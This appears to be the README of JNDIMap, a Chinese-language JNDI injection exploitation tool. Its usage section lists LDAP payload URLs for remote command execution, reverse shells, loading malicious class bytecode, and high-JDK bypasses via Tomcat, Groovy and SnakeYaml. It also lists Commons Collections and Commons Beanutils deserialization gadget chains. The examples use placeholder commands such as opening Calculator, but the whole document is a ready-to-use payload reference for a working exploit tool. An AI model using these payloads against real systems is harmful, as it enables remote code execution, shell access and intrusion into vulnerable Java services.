# JNDIMap

JNDI 注入利用工具

目前支持以下功能

- DnsLog
- 命令执行
- 反弹 Shell
- 加载自定义 Class 字节码
- Tomcat/Groovy/SnakeYaml 绕过高版本 JDK
- LDAP 反序列化

## Usage

注意传入的 Base64 应为 Base64 URL 编码, 即把 `+` 和 `/` 替换为 `-` 和 `_`

```bash
# DnsLog
ldap://127.0.0.1:1389/Basic/DnsLog/xxx.dnslog.cn

# 命令执行
ldap://127.0.0.1:1389/Basic/Command/open -a Calculator
ldap://127.0.0.1:1389/Basic/Command/Base64/b3BlbiAtYSBDYWxjdWxhdG9yCg==

# 从字符串/服务器上的某个路径加载自定义的 Class 字节码
ldap://127.0.0.1:1389/Basic/FromCode/<base64-java-bytecode>
ldap://127.0.0.1:1389/Basic/FromPath/<base64-path-to-evil-class-file>

# 反弹 Shell
ldap://127.0.0.1:1389/Basic/ReverseShell/127.0.0.1/4444

# 以下 Bypass 方式支持 Basic 所有功能

# Tomcat Bypass
ldap://127.0.0.1:1389/TomcatBypass/Command/open -a Calculator

# Groovy Bypass
ldap://127.0.0.1:1389/GroovyClassLoader/Command/open -a Calculator
ldap://127.0.0.1:1389/GroovyShell/Command/open -a Calculator

# SnakeYaml Bypass
ldap://127.0.0.1:1389/SnakeYaml/Command/open -a Calculator
ldap://127.0.0.1:1389/SnakeYaml/Command/open -a Calculator

# 自定义数据 反序列化
ldap://127.0.0.1:1389/Deserialize/<base64-serialize-data>

# CommonsCollectionsK1 反序列化 (3.1 + TemplatesImpl), 支持命令执行和反弹 Shell
ldap://127.0.0.1:1389/Deserialize/CommonsCollectionsK1/Command/open -a Calculator
ldap://127.0.0.1:1389/Deserialize/CommonsCollectionsK1/Command/Base64/b3BlbiAtYSBDYWxjdWxhdG9yCg==
ldap://127.0.0.1:1389/Deserialize/CommonsCollectionsK1/ReverseShell/127.0.0.1/4444

# CommonsCollectionsK2 反序列化 (4.0 + TemplatesImpl), 功能同上
ldap://127.0.0.1:1389/Deserialize/CommonsCollectionsK2/Command/open -a Calculator

# CommonsCollectionsK3 反序列化 (3.1 + Runtime.exec), 仅支持命令执行
ldap://127.0.0.1:1389/Deserialize/CommonsCollectionsK3/Command/open -a Calculator
ldap://127.0.0.1:1389/Deserialize/CommonsCollectionsK3/Command/Base64/b3BlbiAtYSBDYWxjdWxhdG9yCg==

# CommonsCollectionsK4 反序列化 (4.0 + Runtime.exec), 功能同上
ldap://127.0.0.1:1389/Deserialize/CommonsCollectionsK4/Command/open -a Calculator

# CommonsBeanutils1NoCC 反序列化 (1.9.4, 无需 commons-collections 依赖), 使用 TemplatesImpl, 支持命令和反弹 Shell
ldap://127.0.0.1:1389/Deserialize/CommonsBeanutils1NoCC/Command/open -a Calculator
ldap://127.0.0.1:1389/Deserialize/CommonsBeanutils1NoCC/Command/Base64/b3BlbiAtYSBDYWxjdWxhdG9yCg==
ldap://127.0.0.1:1389/Deserialize/CommonsBeanutils1NoCC/ReverseShell/127.0.0.1/4444
```